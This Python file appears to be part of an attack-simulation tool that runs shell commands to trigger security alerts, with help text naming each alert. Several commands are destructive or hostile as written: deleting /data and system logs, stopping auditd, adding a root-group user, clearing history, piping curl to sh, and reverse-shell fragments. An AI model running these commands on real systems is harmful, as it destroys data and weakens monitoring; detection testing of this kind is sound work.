from venv.AaSystem.Colors import PrintRed
from venv.AttackAgent.Bash.BashCommandExecutor import RunSubProcess


class BashCommands:
    def IpConfig(self):
        return RunSubProcess("ipconfig")

    def AddSuspiciousUser(self):
        return RunSubProcess("sudo useradd aaa -g 0")

    def SuspiciousNohup(self):
        return RunSubProcess("nohup cat /tmp/")

    def ReverseShell(self):
        return RunSubProcess("python import socket /bin/sh")

    def RemovelOfSystemLogs(self):
        return RunSubProcess("rm /var/log/lastlog")

    def Ransomware(self):
        return RunSubProcess("touch test.GNNCRY")

    def PrivilegedContainer(self):
        return RunSubProcess("docker run redis --privileged")

    def PossibleMalware(self):
        return RunSubProcess(" curl pastebin.com")

    def OverrideLinuxFiles(self):
        return RunSubProcess("cp /bin/netstat a")

    def LinuxReconnaissance(self):
        return RunSubProcess("uname -n -s -r -v")

    def LinuxBackdoor(self):
        return RunSubProcess("touch d-bus notifier")

    def FairwareMalware(self):
        return RunSubProcess("rm -rf /data/")

    def EgressData(self):
        return RunSubProcess("bash /dev/tcp/")

    def DownloadFileThenRun(self):
        return RunSubProcess("curl google.com | sh")

    def DisableFirewall(self):
        return RunSubProcess("touch f0VMRgIBAQ")

    def DisableAuditdLogging(self):
        return RunSubProcess("sudo service auditd stop")

    def CryptoMiner(self):
        return RunSubProcess("git clone https://github.com/cpuminer")

    def CommonBots(self):
        return RunSubProcess("touch RTEGFN01.dat")

    def ClearHistoryFile(self):
        return RunSubProcess("history -c")


class BashCommandsHelp:
    def IpConfig(self):
        return print("Performs the bash command: 'ipconfig'\n"
                     "Meant as a simple code functionality and sanity test")

    def AddSuspiciousUser(self):
        return print("Performs the bash command: 'sudo useradd aaa -g 0'\n"
                     "Triggers alert: 'AddSuspiciousUser'")

    def SuspiciousNohup(self):
        return print("Performs the bash command: 'nohup cat /tmp/'\n"
                     "Triggers alert: 'SuspiciousNohup'")

    def ReverseShell(self):
        return print("Performs the bash command: 'python import socket /bin/sh'\n"
                     "Triggers alert: 'ReverseShell'")

    def RemovelOfSystemLogs(self):
        return print("Performs the bash command: 'rm /var/log/lastlog'\n"
                     "Triggers alert: 'RemovelOfSystemLogs'")

    def Ransomware(self):
        return print("Performs the bash command: 'touch test.GNNCRY'\n"
                     "Triggers alert: 'Ransomware'")

    def PrivilegedContainer(self):
        return print("Performs the bash command: 'docker run redis --privileged'\n"
                     "Triggers alert: 'PrivilegedContainer'")

    def PossibleMalware(self):
        return print("Performs the bash command: 'curl pastebin.com'\n"
                     "Triggers alert: 'PossibleMalware'")

    def OverrideLinuxFiles(self):
        return print("Performs the bash command: 'cp /bin/netstat a'\n"
                     "Triggers alert: 'OverrideLinuxFiles'")

    def LinuxReconnaissance(self):
        return print("Performs the bash command: 'uname -n -s -r -v'\n"
                     "Triggers alert: 'LinuxReconnaissance'")

    def LinuxBackdoor(self):
        print("Performs the bash command: 'touch d-bus notifier'\n"
              "Triggers alert: 'LinuxBackdoor'")

    def FairwareMalware(self):
        return print("Performs the bash command: 'rm -rf /data/'\n"
                     "Triggers alert: 'FairwareMalware'")

    def EgressData(self):
        return print("Performs the bash command: 'bash /dev/tcp/'\n"
                     "Triggers alert: 'EgressData'")

    def DownloadFileThenRun(self):
        return print("Performs the bash command: 'curl google.com | sh'\n"
                     "Triggers alert: 'DownloadFileThenRun'")

    def DisableFirewall(self):
        return print("Performs the bash command: 'touch f0VMRgIBAQ'\n"
                     "Triggers alert: 'DisableFirewall'")

    def DisableAuditdLogging(self):
        return print("Performs the bash command: 'sudo service auditd stop'\n"
                     "Triggers alert: 'DisableAuditdLogging'")

    def CryptoMiner(self):
        return print("Performs the bash command: 'git clone https://github.com/cpuminer'\n"
                     "Triggers alert: 'CryptoMiner'")

    def CommonBots(self):
        return print("Performs the bash command: 'touch RTEGFN01.dat'\n"
                     "Triggers alert: 'CommonBots'")

    def ClearHistoryFile(self):
        return print("Performs the bash command: 'history -c'\n"
                     "Triggers alert: 'ClearHistoryFile'")


def GetBashCommandsSwitch(helpRequested=False):
    commands = BashCommands() if not helpRequested else BashCommandsHelp()
    switchOptions = {
        'getip': commands.IpConfig,
        'addsuspicioususer': commands.AddSuspiciousUser,
        'suspiciousnohup': commands.SuspiciousNohup,
        'reverseshell': commands.ReverseShell,
        'removelofsystemlogs': commands.RemovelOfSystemLogs,
        'ransomware': commands.Ransomware,
        'privilegedcontainer': commands.PrivilegedContainer,
        'possiblemalware': commands.PossibleMalware,
        'overridelinuxfiles': commands.OverrideLinuxFiles,
        'linuxreconnaissance': commands.LinuxReconnaissance,
        'linuxbackdoor': commands.LinuxBackdoor,
        'fairwaremalware': commands.FairwareMalware,
        'egressdata': commands.EgressData,
        'downloadfilethenrun': commands.DownloadFileThenRun,
        'disablefirewall': commands.DisableFirewall,
        'disableauditdlogg': commands.DisableAuditdLogging,
        'cryptominer': commands.CryptoMiner,
        'commonbots': commands.CommonBots,
        'clearhistoryfile': commands.ClearHistoryFile
    }

    return switchOptions


def HelpRequested(availableCommands):
    print("Command parameters: ba [BashCommand]\n"
          "ba: stands for Bash Attack. ba commands run bash code aimed at triggering alerts supporting larger attack"
          "functions\n"
          "     'BashCommand' - The type of Bash Command that will be run"
          "     Possible BashCommands:")
    for command in availableCommands:
        print(f"            {command}")
    print("     For more information on a command add -help after a command, i.e.: '-ba getip -help'")


def PerformCustomCommand(request):
    if not request:
        PrintRed("Missing bash command")
    return RunSubProcess(request[0])


def RunBashCommand(request):
    if not request:
        PrintRed(f"No Bash command to execute passed in parameters")
        return
    command = str.lower(request[0])
    availableBashCommands = GetBashCommandsSwitch().keys()
    if command == "-help":
        HelpRequested(availableBashCommands)
        return
    if command == "-c":
        PerformCustomCommand(request[1:])
        return
    if command not in availableBashCommands:
        PrintRed(f"No such Bash Attack: '{command}'")
        return
    bashCommandHelpRequested = "-help" in request
    GetBashCommandsSwitch(bashCommandHelpRequested)[command]()
